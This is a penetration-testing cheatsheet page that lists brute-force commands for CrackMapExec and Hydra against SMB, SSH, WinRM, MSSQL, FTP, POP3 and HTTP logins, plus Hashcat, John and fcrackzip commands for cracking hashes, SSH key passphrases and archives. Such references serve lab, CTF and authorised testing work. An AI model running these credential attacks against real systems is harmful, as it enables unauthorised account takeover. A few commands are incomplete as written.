---
layout: commands
title: Brute Force
date: 2020-08-13
preview: Cheatsheet for brute force attacking
categories: 
    - "commands"
    - "pentest"
    - "enumeration"
---

# Brute force services

## CrackMapExec

### SMB

SMB with username and password - Use to confirm

```bash
crackmapexec smb $TARGETIP -u 'username' -p 'password'
```

SMB known username with wordlist

```bash
crackmapexec smb $TARGETIP -u 'username' -p /path/to/file
```

SMB with user and password list

```bash
crackmapexec smb $TARGETIP -u /path/to/file -p /path/to/file
```

### SSH

SSH with username and password - Use to confirm

```bash
crackmapexec ssh $TARGETIP -u 'username' -p 'password'
```

SSH known username with wordlist

```bash
crackmapexec ssh $TARGETIP -u 'username' -p /path/to/file
```

SSH with user and password list

```bash
crackmapexec ssh $TARGETIP -u /path/to/file -p /path/to/file
```

### WinRM

WINRM with username and password - Use to confirm

```bash
crackmapexec winrm $TARGETIP -u 'username' -p 'password'
```

WINRM known username with wordlist

```bash
crackmapexec winrm $TARGETIP -u 'username' -p /path/to/file
```

WINRM with user and password list

```bash
crackmapexec winrm $TARGETIP -u /path/to/file -p /path/to/file
```

### MSSQL

MSSQL with username and password - Use to confirm

```bash
crackmapexec mssql $TARGETIP -u 'username' -p 'password'
```

MSSQL known username with wordlist


```bash
crackmapexec mssql $TARGETIP -u 'username' -p /path/to/file
```

MSSQL with user and password list

```bash
crackmapexec mssql $TARGETIP -u /path/to/file -p /path/to/file
```

## Hydra

### SSH

```bash
hydra -t 4 -l <USER> -P <PASSWORD> ssh://$TARGETIP
```

### SMB

```bash
hydra -t 4 -l <USER> -P <PASSWORD> smb://$TARGETIP
```

### POP3

```bash
hydra -t 4 -l <USER> -P <PASSWORD> pop3
```

### FTP

```bash
hydra -t 4 -l <USER> -P <PASSWORD> ftp
```

### HTTP WebDav

```bash
hydra -l webdav -P <WORDLISTS> -s 80 -f $TARGETIP http-get /webdav
```

### HTTP Form

```bash
hydra -l "user" -P <WORDLISTS> $TARGETIP http-post-form /
"/path?FormVariables=Value&:UserFormField=^USER^&PasswordFormField=^PASS^:F=MessageOnFailure" -V
```

## HTTP

See <a href="/blog/2020/08/10/http-enumeration">HTTP/S Enumeration Cheatsheet</a>


# Brute force passwords

## Password List

### Rockyou

```bash
/usr/share/wordlists/rockyou.txt
```

## Hashcat

### MD5

```bash
hashcat -m 0 -a 0 -o /path/to/results /path/to/hashfile /path/to/wordlist
```

### SHA1

```bash
hashcat -m 100 -a 0 -o /path/to/results  /path/to/hashfile /path/to/wordlist
```

Modes [https://hashcat.net/wiki/doku.php?id=hashcat](https://hashcat.net/wiki/doku.php?id=hashcat)

## John

### Hash

```bash
john --wordlist=/path/to/file /path/to/hashes
```

### Show
```bash
john --show /path/to/hashes
```

### Convert for John

Folder

```bash
/usr/share/john/
```

SSH private key

```bash
/usr/share/john/ssh2john.py id_rsa > johnhash
```

Brute force passphrase

```bash
john --wordlist=/path/to/wordlist johnhash
```

Encrypted PDF

```bash
/usr/share/john/pdf2john.pl
```

## FCrackZip

### Zip file

```bash
fcrackzip -u -D -p <WORDLIST> <FILE>
```

